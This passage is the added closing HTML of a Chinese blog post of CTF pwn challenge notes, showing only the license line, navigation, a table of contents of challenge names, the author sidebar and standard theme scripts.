+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-cn" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/PWN/" rel="tag"><i class="fa fa-tag"></i> PWN</a>
+              <a href="/tags/CTF/" rel="tag"><i class="fa fa-tag"></i> CTF</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/Ubuntu%E4%B8%8BPWN%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E5%B0%8F%E7%BB%93.html" rel="prev" title="Ubuntu下PWN环境配置小结">
+      <i class="fa fa-chevron-left"></i> Ubuntu下PWN环境配置小结
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/Git%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE.html" rel="next" title="Git思维导图">
+      Git思维导图 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#int-overflow"><span class="nav-number">2.</span> <span class="nav-text">int_overflow</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Hello-pwn"><span class="nav-number">3.</span> <span class="nav-text">Hello_pwn</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#cgpwn2"><span class="nav-number">4.</span> <span class="nav-text">cgpwn2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#get-shell"><span class="nav-number">5.</span> <span class="nav-text">get_shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CGfsb"><span class="nav-number">6.</span> <span class="nav-text">CGfsb</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#when-did-you-born"><span class="nav-number">7.</span> <span class="nav-text">when_did_you_born</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level0"><span class="nav-number">8.</span> <span class="nav-text">level0</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level2"><span class="nav-number">9.</span> <span class="nav-text">level2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level3"><span class="nav-number">10.</span> <span class="nav-text">level3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#guess-num"><span class="nav-number">11.</span> <span class="nav-text">guess_num</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#string"><span class="nav-number">12.</span> <span class="nav-text">string</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="李钰璕"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">李钰璕</p>
+  <div class="site-description" itemprop="description">安全学习笔记</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">89</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">17</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">115</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Leeyuxun" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Leeyuxun" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i></a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:leeyuxun@163.com" title="E-Mail → mailto:leeyuxun@163.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i></a>
+      </span>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        <!--
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">李钰璕</span>
+</div>
+-->
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/pangu@4/dist/browser/pangu.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+      
+
+<script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      loader: {
+          load: ['[tex]/mhchem'],
+        source: {
+          '[tex]/amsCd': '[tex]/amscd',
+          '[tex]/AMScd': '[tex]/amscd'
+        }
+      },
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+          packages: {'[+]': ['mhchem']},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              let target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    (function () {
+      var script = document.createElement('script');
+      script.src = 'true';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+    
+
+  
+
+</body>
+</html>
